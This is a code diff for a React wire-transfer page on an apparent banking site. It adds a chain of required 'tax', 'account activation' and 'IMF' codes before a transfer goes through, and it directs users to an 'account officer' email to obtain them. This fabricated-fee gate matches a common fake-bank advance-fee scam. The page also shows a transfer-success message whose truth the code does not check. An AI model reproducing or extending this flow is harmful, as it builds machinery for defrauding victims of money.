@@ -11,16 +11,17 @@ const Wiretransfer = () => {
   const [receiverAccount, setReceiverAccount] = useState("");
   const [receiverName, setReceiverName] = useState("");
   const [receiverBank, setReceiverBank] = useState("");
-  const [swiftCode, setSwiftCode] = useState("");
+  const [iban, setIban] = useState(""); 
+  const [swiftCode, setSwiftCode] = useState(""); 
   const [purpose, setPurpose] = useState("");
   const [recipientAddress, setRecipientAddress] = useState("");
-  const [otpCode, setOtpCode] = useState("");
-  const [transferId, setTransferId] = useState(null);
+
+  const [currentCodeType, setCurrentCodeType] = useState(null);
+  const [codeInput, setCodeInput] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
-  const [showOtpModal, setShowOtpModal] = useState(false); // ✅ MISSING STATE
+  const [showCodeModal, setShowCodeModal] = useState(false);
 
-  // ✅ TRANSFER SUBMIT
   const handleTransferSubmit = async (e) => {
     e.preventDefault();
     setError("");
@@ -34,32 +35,45 @@ const Wiretransfer = () => {
         return;
       }
 
+      const requestData = {
+        amount: parseFloat(amount),
+        receiver_account: receiverAccount,
+        receiver_name: receiverName,
+        receiver_bank: receiverBank,
+        iban,
+        swift_code: swiftCode,
+        purpose,
+        recipient_address: recipientAddress,
+      };
+
       const res = await fetch("https://geochain.app/apps/api/transfers/", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
           Authorization: `Bearer ${token}`,
+          "Device-ID": "WEB",
         },
-        body: JSON.stringify({
-          amount: parseFloat(amount),
-          receiver_account: receiverAccount, // ✅ sending receiver account
-          receiver_name: receiverName,
-          receiver_bank: receiverBank,
-          swift_code: swiftCode,
-          purpose,
-          recipient_address: recipientAddress, // ✅ sending recipient address
-        }),
+        body: JSON.stringify(requestData),
         credentials: "include",
       });
 
-      if (!res.ok) {
-        const err = await res.json();
-        throw new Error(err.detail || "Transfer failed");
-      }
-
       const data = await res.json();
-      setTransferId(data.transfer_id);
-      setShowOtpModal(true);
+
+      if (!res.ok) throw new Error(data.detail || "Transfer failed");
+
+      if (data.code_type || data.next_code_type) {
+        // Show modal for next step code
+        setCurrentCodeType(data.code_type || data.next_code_type);
+        setCodeInput("");
+        setShowCodeModal(true);
+      } else {
+        // Transfer complete
+        alert("Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!");
+        setShowCodeModal(false);
+        setCurrentCodeType(null);
+        setCodeInput("");
+        window.location.href = "/transaction";
+      }
     } catch (err) {
       setError(err.message);
     } finally {
@@ -67,44 +81,52 @@ const Wiretransfer = () => {
     }
   };
 
-  // ✅ OTP SUBMIT
-  const handleOtpSubmit = async (e) => {
+  const handleCodeSubmit = async (e) => {
     e.preventDefault();
     setError("");
     setLoading(true);
 
     try {
       const token = localStorage.getItem("accessToken");
-      if (!token) {
-        localStorage.clear();
-        window.location.href = "/login";
-        return;
-      }
+      let codeKey = currentCodeType === "email_otp" ? "email_otp" : `${currentCodeType}_code`;
 
-      const res = await fetch(
-        `https://geochain.app/apps/api/transfers/${transferId}/verify/`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            Authorization: `Bearer ${token}`,
-          },
-          body: JSON.stringify({ verification_code: otpCode }),
-          // ✅ ensure token/cookies are sent if needed
-          credentials: "include",
+      const requestData = {
+        amount: parseFloat(amount),
+        receiver_account: receiverAccount,
+        receiver_name: receiverName,
+        receiver_bank: receiverBank,
+        iban,
+        swift_code: swiftCode,
+        purpose,
+        recipient_address: recipientAddress,
+        [codeKey]: codeInput,
+      };
+
+      const res = await fetch("https://geochain.app/apps/api/transfers/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Authorization: `Bearer ${token}`,
+          "Device-ID": "WEB",
         },
-      );
+        body: JSON.stringify(requestData),
+      });
 
       const data = await res.json();
 
-      if (!res.ok) {
-        throw new Error(data.detail || "OTP verification failed");
-      }
+      if (!res.ok) throw new Error(data.detail || "Verification failed");
 
-      alert("Transfer verified. Pending approval.");
-      setShowOtpModal(false);
-      setOtpCode("");
-      window.location.href = "/transaction";
+      if (data.code_type) {
+        setCurrentCodeType(data.code_type);
+        setCodeInput("");
+        setShowCodeModal(true);
+      } else {
+        alert("Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!");
+        setShowCodeModal(false);
+        setCurrentCodeType(null);
+        setCodeInput("");
+        window.location.href = "/transaction";
+      }
     } catch (err) {
       setError(err.message);
     } finally {
@@ -112,24 +134,99 @@ const Wiretransfer = () => {
     }
   };
 
+  const handleResendOtp = async () => {
+    setLoading(true);
+    setError("");
+    try {
+      const token = localStorage.getItem("accessToken");
+      const res = await fetch("https://geochain.app/apps/api/transfers/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Authorization: `Bearer ${token}`,
+          "Device-ID": "WEB",
+        },
+        body: JSON.stringify({
+          resend: true,
+        }),
+        credentials: "include",
+      });
+
+      const data = await res.json();
+
+      if (!res.ok) throw new Error(data.detail || "Failed to resend OTP");
+
+      alert("OTP has been resent successfully.");
+    } catch (err) {
+      setError(err.message);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+
+
+  const handleResendactivation = async () => {
+    setLoading(true);
+    setError("");
+    try {
+      const token = localStorage.getItem("accessToken");
+      const res = await fetch("https://geochain.app/apps/api/transfers/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Authorization: `Bearer ${token}`,
+          "Device-ID": "WEB",
+        },
+        body: JSON.stringify({
+          resend: true,
+        }),
+        credentials: "include",
+      });
+
+      const data = await res.json();
+
+      if (!res.ok) throw new Error(data.detail || "Failed to Get Code");
+
+      alert("If you do not have this code, please contact your account officer. info@westventonline.org");
+    } catch (err) {
+      setError(err.message);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+
+
+  const getCodeLabel = (type) => {
+  switch (type) {
+    case "email_otp":
+      return "{OTP}";
+    case "tax":
+      return "{TAX CODE}";
+    case "activation":
+      return "{ACCOUNT ACTIVATION CODE}";
+    case "imf":
+      return "{IMF CODE}";
+    default:
+      return "";
+  }
+};
+   
+
+
   return (
     <WiretransferWrapper>
       <div className="profilewrapper">
         <div className="backes">
-          <FaArrowLeft
-            onClick={() => (window.location.href = "/transfer-list")}
-          />
-          <p onClick={() => (window.location.href = "/transfer-list")}>
-            Transfer
-          </p>
+          <FaArrowLeft onClick={() => (window.location.href = "/transfer-list")} />
+          <p onClick={() => (window.location.href = "/transfer-list")}>Transfer</p>
         </div>
 
         <div className="amount">
-          <p>
-            <strong>Balance</strong>
-          </p>
+          <p><strong>Balance</strong></p>
           <strong>
-            $
+            ${" "}
             {new Intl.NumberFormat("en-US", {
               minimumFractionDigits: 2,
               maximumFractionDigits: 2,
@@ -137,10 +234,18 @@ const Wiretransfer = () => {
           </strong>
         </div>
 
-        <form onSubmit={handleTransferSubmit}>
+       <form
+  onSubmit={handleTransferSubmit}
+  onKeyDown={(e) => {
+    // If modal is open, block Enter key on main form
+    if (showCodeModal && e.key === "Enter") {
+      e.preventDefault();
+    }
+  }}
+>
           <div>
             <label>From Account</label>
-            <input value={fetchdata?.account?.account_number} disabled />
+            <input value={fetchdata?.account?.account_number || ""} disabled />
           </div>
 
           <div>
@@ -151,6 +256,7 @@ const Wiretransfer = () => {
               required
             />
           </div>
+
           <div>
             <label>Receiver’s Full Name</label>
             <input
@@ -159,6 +265,7 @@ const Wiretransfer = () => {
               required
             />
           </div>
+
           <div>
             <label>Receiver’s Bank</label>
             <input
@@ -167,13 +274,25 @@ const Wiretransfer = () => {
               required
             />
           </div>
+
           <div>
-            <label>SWIFT / Iban</label>
+            <label>IBAN</label>
+            <input
+              value={iban}
+              onChange={(e) => setIban(e.target.value)}
+              required
+            />
+          </div>
+
+          <div>
+            <label>SWIFT / BIC</label>
             <input
               value={swiftCode}
               onChange={(e) => setSwiftCode(e.target.value)}
+              required
             />
           </div>
+
           <div>
             <label>Recipient Address</label>
             <input
@@ -201,27 +320,34 @@ const Wiretransfer = () => {
               required
             />
           </div>
+
           <div className="btn">
             <button type="submit" disabled={loading}>
               {loading ? "Processing..." : "Transfer"}
             </button>
-
             {error && <p style={{ color: "red" }}>{error}</p>}
           </div>
         </form>
 
-        {showOtpModal && (
+{/* styling this one */}
+        {showCodeModal && (
+
           <div className="otp-modal">
             <div className="close">
-              <h3>Enter OTP Code</h3>
-              <p onClick={() => setShowOtpModal(false)}>
+           <h3>Code Required <span>{getCodeLabel(currentCodeType)}</span></h3>
+
+               <p onClick={() => setShowCodeModal(false)}>
                 <MdOutlineClose />
               </p>
             </div>
-            <form onSubmit={handleOtpSubmit}>
+            <h3>
+  Please enter your <span>{getCodeLabel(currentCodeType)}</span> below to process your transfer
+</h3>
+
+            <form onSubmit={handleCodeSubmit}>
               <input
-                value={otpCode}
-                onChange={(e) => setOtpCode(e.target.value)}
+                value={codeInput}
+                onChange={(e) => setCodeInput(e.target.value)}
                 maxLength={6}
                 placeholder="6-digit code"
                 required
@@ -229,50 +355,47 @@ const Wiretransfer = () => {
               <button className="mysumit" type="submit">
                 {loading ? "Verifying..." : "Verify"}
               </button>
-              <button
-                className="cancels"
-                type="button"
-                onClick={async () => {
-                  if (!transferId) return; // safety check
-                  setLoading(true);
-                  setError("");
-                  try {
-                    const token = localStorage.getItem("accessToken");
-                    const res = await fetch(
-                      "https://geochain.app/apps/api/transfers/",
-                      {
-                        method: "POST",
-                        headers: {
-                          "Content-Type": "application/json",
-                          Authorization: `Bearer ${token}`,
-                        },
-                        body: JSON.stringify({
-                          transfer_id: transferId,
-                          resend: true,
-                        }),
-                        credentials: "include",
-                      },
-                    );
 
-                    const data = await res.json();
+              {/* ONLY show resend for email OTP */}
+              {currentCodeType === "email_otp" && (
+                <button className="cancels" type="button" onClick={handleResendOtp}>
+                  {loading ? "Sending..." : "Resend OTP"}
+                </button>
+              )}
+              {currentCodeType === "tax" && (
+                <button className="cancels" type="button" onClick={handleResendactivation}>
+                  {loading ? "Sending..." : "Get TAX CODE"}
+                </button>
+              )}
+              {currentCodeType === "activation" && (
+                <button className="cancels" type="button" onClick={handleResendactivation}>
+                  {loading ? "Sending..." : "Get ACTIVATION CODE"}
+                </button>
+              )}
+              {currentCodeType === "imf" && (
+                <button className="cancels" type="button" onClick={handleResendactivation}>
+                  {loading ? "Sending..." : "Get IMF CODE"}
+                </button>
+              )}
 
-                    if (!res.ok)
-                      throw new Error(data.detail || "Failed to resend OTP");
 
-                    alert("OTP resent successfully. Check your email.");
-                  } catch (err) {
-                    setError(err.message);
-                  } finally {
-                    setLoading(false);
-                  }
-                }}
-              >
-                {loading ? "Sending..." : "Resend OTP"}
-              </button>
+
+
+{(currentCodeType === "tax" ||
+  currentCodeType === "activation" ||
+  currentCodeType === "imf") && (
+    <div className="conatcoffier">
+      <p>If you do not have this code, please contact your account officer</p>
+      <span>info@westventonline.org</span>
+    </div>
+)}
+
+
+
             </form>
             {error && <p style={{ color: "red" }}>{error}</p>}
           </div>
-        )}
+         )} 
       </div>
     </WiretransferWrapper>
   );
